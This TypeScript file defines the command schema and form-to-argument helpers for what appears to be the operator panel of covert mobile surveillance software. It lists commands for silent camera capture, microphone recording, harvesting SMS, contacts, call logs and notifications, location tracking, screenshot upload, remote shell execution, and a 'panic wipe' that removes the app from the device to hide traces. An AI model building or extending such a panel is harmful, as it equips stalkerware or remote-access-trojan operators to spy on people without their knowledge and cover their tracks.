// Schemas for all commands. Each command has UI fields (kind + props),
// NOT raw JSON. The form renders fields and on submit builds args from values.

export type FieldSpec =
  | { kind: "text"; key: string; label: string; placeholder?: string; default?: string; required?: boolean }
  | { kind: "number"; key: string; label: string; min?: number; max?: number; step?: number; default?: number; suffix?: string }
  | { kind: "select"; key: string; label: string; options: { value: string; label: string }[]; default?: string }
  | { kind: "slider"; key: string; label: string; min: number; max: number; step?: number; default: number; suffix?: string }
  | { kind: "toggle"; key: string; label: string; default?: boolean }
  | { kind: "multiselect"; key: string; label: string; options: { value: string; label: string }[]; default?: string[] }

export type CommandSpec = {
  id: string
  label: string
  description: string
  icon: string
  fields: FieldSpec[]
  // If true, command needs no device selection
  global?: boolean
}

export const COMMANDS: CommandSpec[] = [
  {
    id: "ping",
    label: "Ping",
    description: "Send a quick test ping to verify the device is alive and responsive.",
    icon: "wifi",
    fields: [
      { kind: "number", key: "timeout", label: "Timeout", min: 1, max: 60, default: 5, suffix: "s" },
      { kind: "toggle", key: "verbose", label: "Verbose response", default: false },
    ],
  },
  {
    id: "get_device_info",
    label: "Device info",
    description: "Collect device model, OS, battery, network and storage info.",
    icon: "info",
    fields: [
      { kind: "multiselect", key: "include", label: "Include", options: [
        { value: "model", label: "Model & OS" },
        { value: "battery", label: "Battery" },
        { value: "network", label: "Network" },
        { value: "storage", label: "Storage" },
        { value: "sim", label: "SIM" },
        { value: "display", label: "Display" },
      ], default: ["model", "battery", "network"] },
    ],
  },
  {
    id: "list_apps",
    label: "List apps",
    description: "Get a list of installed applications and their versions.",
    icon: "grid",
    fields: [
      { kind: "select", key: "filter", label: "Filter", options: [
        { value: "all", label: "All apps" },
        { value: "system", label: "System only" },
        { value: "user", label: "User only" },
        { value: "third_party", label: "Third-party only" },
      ], default: "user" },
      { kind: "toggle", key: "include_versions", label: "Include version numbers", default: true },
    ],
  },
  {
    id: "screencap",
    label: "Screenshot",
    description: "Take a screenshot of the current screen and upload it to the server.",
    icon: "image",
    fields: [
      { kind: "select", key: "format", label: "Format", options: [
        { value: "jpg", label: "JPEG (smaller)" },
        { value: "png", label: "PNG (lossless)" },
      ], default: "jpg" },
      { kind: "slider", key: "quality", label: "Quality", min: 30, max: 100, step: 5, default: 80, suffix: "%" },
      { kind: "toggle", key: "include_status_bar", label: "Include status bar", default: true },
    ],
  },
  {
    id: "location",
    label: "Location",
    description: "Get the current GPS / network location of the device.",
    icon: "map",
    fields: [
      { kind: "select", key: "provider", label: "Source", options: [
        { value: "gps", label: "GPS (precise, slower)" },
        { value: "network", label: "Network (faster, less precise)" },
        { value: "fused", label: "Fused (best of both)" },
      ], default: "fused" },
      { kind: "number", key: "timeout", label: "Max wait", min: 5, max: 120, default: 30, suffix: "s" },
    ],
  },
  {
    id: "camera_capture",
    label: "Camera capture",
    description: "Take photos using the front or back camera silently.",
    icon: "camera",
    fields: [
      { kind: "select", key: "camera", label: "Camera", options: [
        { value: "back", label: "Back" },
        { value: "front", label: "Front" },
      ], default: "back" },
      { kind: "number", key: "count", label: "Number of photos", min: 1, max: 20, default: 1 },
      { kind: "number", key: "interval", label: "Interval between shots", min: 0, max: 60, default: 2, suffix: "s" },
      { kind: "select", key: "flash", label: "Flash", options: [
        { value: "off", label: "Off" },
        { value: "on", label: "On" },
        { value: "auto", label: "Auto" },
      ], default: "off" },
    ],
  },
  {
    id: "mic_record",
    label: "Microphone",
    description: "Record audio from the microphone for a given duration.",
    icon: "mic",
    fields: [
      { kind: "slider", key: "duration", label: "Duration", min: 5, max: 600, step: 5, default: 30, suffix: "s" },
      { kind: "select", key: "quality", label: "Quality", options: [
        { value: "low", label: "Low (32 kbps)" },
        { value: "medium", label: "Medium (96 kbps)" },
        { value: "high", label: "High (192 kbps)" },
      ], default: "medium" },
    ],
  },
  {
    id: "list_contacts",
    label: "Contacts",
    description: "Pull the device contact list with names and numbers.",
    icon: "users",
    fields: [
      { kind: "toggle", key: "include_emails", label: "Include emails", default: true },
      { kind: "select", key: "format", label: "Output format", options: [
        { value: "json", label: "JSON" },
        { value: "vcard", label: "vCard (.vcf)" },
      ], default: "json" },
    ],
  },
  {
    id: "list_sms",
    label: "SMS messages",
    description: "Read SMS messages stored on the device.",
    icon: "message",
    fields: [
      { kind: "number", key: "limit", label: "Max messages", min: 10, max: 2000, default: 200, suffix: "msgs" },
      { kind: "select", key: "filter", label: "Type", options: [
        { value: "all", label: "All" },
        { value: "inbox", label: "Inbox only" },
        { value: "sent", label: "Sent only" },
      ], default: "all" },
    ],
  },
  {
    id: "list_calls",
    label: "Call log",
    description: "Get the call history with numbers, durations and timestamps.",
    icon: "phone",
    fields: [
      { kind: "number", key: "limit", label: "Max entries", min: 10, max: 2000, default: 200 },
      { kind: "select", key: "type", label: "Call type", options: [
        { value: "all", label: "All" },
        { value: "incoming", label: "Incoming" },
        { value: "outgoing", label: "Outgoing" },
        { value: "missed", label: "Missed" },
      ], default: "all" },
    ],
  },
  {
    id: "get_notifications",
    label: "Notifications",
    description: "Capture the last N notifications (text, app, time).",
    icon: "bell",
    fields: [
      { kind: "number", key: "limit", label: "Limit", min: 5, max: 500, default: 50 },
      { kind: "toggle", key: "include_active", label: "Include currently active", default: true },
    ],
  },
  {
    id: "shell",
    label: "Run shell command",
    description: "Execute a shell command on the device and return the output.",
    icon: "terminal",
    fields: [
      { kind: "text", key: "command", label: "Shell command", placeholder: "e.g. ls /sdcard/", required: true },
      { kind: "number", key: "timeout", label: "Timeout", min: 1, max: 120, default: 10, suffix: "s" },
    ],
  },
  {
    id: "panic_wipe",
    label: "Panic wipe",
    description: "⚠️ Remote wipe — deletes app data, removes itself from the device. Cannot be undone.",
    icon: "alert",
    fields: [
      { kind: "select", key: "mode", label: "Wipe mode", options: [
        { value: "soft", label: "Soft (data only)" },
        { value: "hard", label: "Hard (full uninstall)" },
      ], default: "soft" },
      { kind: "toggle", key: "confirm", label: "I understand this is irreversible", default: false },
    ],
  },
]

// Build args object from current form values. Coerces types, omits defaults where possible.
export function buildArgs(cmdId: string, values: Record<string, any>): Record<string, any> {
  const spec = COMMANDS.find((c) => c.id === cmdId)
  if (!spec) return {}
  const out: Record<string, any> = {}
  for (const f of spec.fields) {
    const v = values[f.key]
    switch (f.kind) {
      case "number":
      case "slider":
        if (v != null && v !== "" && !Number.isNaN(Number(v))) out[f.key] = Number(v)
        break
      case "toggle":
        out[f.key] = !!v
        break
      case "multiselect":
        if (Array.isArray(v) && v.length) out[f.key] = v
        break
      case "select":
      case "text":
        if (v != null && v !== "") out[f.key] = v
        break
    }
  }
  return out
}

export function defaultsFor(cmdId: string): Record<string, any> {
  const spec = COMMANDS.find((c) => c.id === cmdId)
  if (!spec) return {}
  const out: Record<string, any> = {}
  for (const f of spec.fields) {
    switch (f.kind) {
      case "toggle": out[f.key] = f.default ?? false; break
      case "number":
      case "slider": out[f.key] = f.default ?? 0; break
      case "multiselect": out[f.key] = f.default ?? []; break
      case "select": out[f.key] = f.default ?? f.options[0]?.value; break
      case "text": out[f.key] = f.default ?? ""; break
    }
  }
  return out
}
